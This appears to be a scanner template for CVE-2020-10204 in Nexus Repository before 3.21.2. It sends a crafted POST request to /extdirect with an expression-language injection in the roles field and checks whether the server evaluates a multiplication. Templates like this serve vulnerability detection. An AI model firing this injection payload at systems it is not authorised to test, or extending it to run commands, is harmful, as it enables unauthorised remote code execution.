id: CVE-2020-10204

info:
    name: Nexus Repository before 3.21.2 Remote Code Execution
    author: kingkk(https://www.kingkk.com/)
    severity: high

set:
    r1: randomInt(40000, 44800)
    r2: randomInt(40000, 44800)
rules:
    r0:
        request:
            method: POST
            path: /extdirect
            headers:
                Content-Type: application/json
            body: |
                {"action":"coreui_User","method":"update","data":[{"userId":"anonymous","version":"1","firstName":"Anonymous","lastName":"User2","email":"anonymous@example.org","status":"active","roles":["$\\c{{{r1}}*{{r2}}}"]}],"type":"rpc","tid":28}
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
expression: r0()

